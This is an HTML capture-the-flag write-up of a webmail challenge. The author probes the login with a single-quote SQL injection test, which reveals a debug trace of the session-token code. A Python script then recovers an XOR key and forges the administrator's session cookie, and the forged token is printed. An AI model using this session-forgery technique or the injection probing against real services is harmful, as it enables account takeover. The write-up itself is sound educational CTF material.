        <h3>Problem</h3>
                    <p>Hack the Gibson
Now that was a useful IMAP service! When I login it segfaults.
Let's try the credentials on the webmail service instead and see if you can find anything interesting there.
<br> <a href="http://quals-8ceec0d5dbf2aae0.ctf.pixels.camp/">Shay D'Mail</a> </p>
                    <h3>Solution</h3>
                    <p>As soon as we clicked on the Shay D'Mail link we were redirected to this website:</p>

                    <img src="imgs/ctf3_1.png" alt="img1" class="centered-image"></img>                    

                    <p>
                    Once we had a username and a password from the previous exercise we tried to enter the service with those credentials. Being them:
                    <br>Email address: pjsmith 
                    <br>Password: freire7f1
                    <br>
                    And, we were in:
                    </p>

                    <img src="imgs/ctf3_2.png" alt="img2" class="centered-image"></img>
                    <br>
                    <img src="imgs/ctf3_3.png" alt="img3" class="centered-image"></img>

                    <p>
                        From this inbox message, we can get another account registered in the Shay D'Mail, Bruce Walters, which btw is the system administrator. It would be nice if we could access his account. The thing is we got nothing about Bruce and brute forcing is not a solution.
<br>So, we went back to the main page and started to look for some vulnerabilities on the page.
<br>First, we looked in the source code trying to find some clues, but there was nothing. Then we tried to check for some SQL Injection in the page. 
<br>As so, I tried:
<br>Email address: bruce
<br>Password: something'
<br>
And... boom! The debug mode was one! Lucky us!
                    </p>

                    <img src="imgs/ctf3_4.png" alt="img4" class="centered-image"></img>

                    <p>
                    Now we know about their session mechanism, and if we can generate the session token for Bruce we are in! 
<br>The piece of code from generate_session_token(username) is enough to go for it. The only thing that was bothering me was the stream_cipher(user_hash), which would need to be taken care of before we start, I mean, we need to find out which kind of stream_cipher they were using.

<br>My thought was: They are using Python to write their backend, so they might be using some pycrypto library, and from my search, I found that: “Two algorithms are supported by pycrypto: ARC4 and XOR.”. And now we are back to two options: RC4 and XOR. My next thought was immediately: It's an XOR type! :D
<br>So I wrote the following Python script:      
                    </p>

                    <pre>
                    <code class="python">
from Crypto.Cipher import XOR
import hashlib
from itertools import izip, cycle

user1 = "pjsmith"
user1_session_token = "da32ae0cbb112f74a43dd2bd39b8592bfcfbae57"
user2 = "bruce"
user2_session_token = "" # what we want to find out

def gen_user_hash(username):
    user_hash = hashlib.sha1(username).digest()
    return user_hash

def generate_session_token(username, s_token):
    user_hash = gen_user_hash(username)
    return xor_crypt_string(user_hash, s_token).encode('hex')

def xor_crypt_string(data, key):
    return ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(data, cycle(key)))

def stream_cipher(user_hash, k):
    text = user_hash
    key = k
    obj1 = XOR.new(key)
    cipher_text = obj1.encrypt(text)
    return cipher_text

# being an XOR we know that we can find the key by doing: key = ciphertext ^ plaintext
# we have the ciphertext which is the session_token
# and we have the plaintext which is the user1 hash

ciphertext = user1_session_token.decode('hex') 
plaintext = gen_user_hash(user1)
key = xor_crypt_string(ciphertext, plaintext).encode('hex')
print "Key: " + key
user2_session_token = stream_cipher(gen_user_hash(user2), key.decode('hex')).encode('hex')
print "Bruce session_token: " + user2_session_token
print "Cookie: " + user2 + ":" + user2_session_token
                    </code></pre>

                    <p>Running that script will give us the session token for the system administrator, Bruce.
<br><b>bruce:ccbf1fb417b28a6ea609d57af60f725d320e50bb</b>
<br>Setting it up with Firebug will give us access to Bruce's account:  </p>

                    <p>
                        And we finished our exercise, where our  answer to the problem would be "vhs bank account".
<br>And the flag of the exercise:
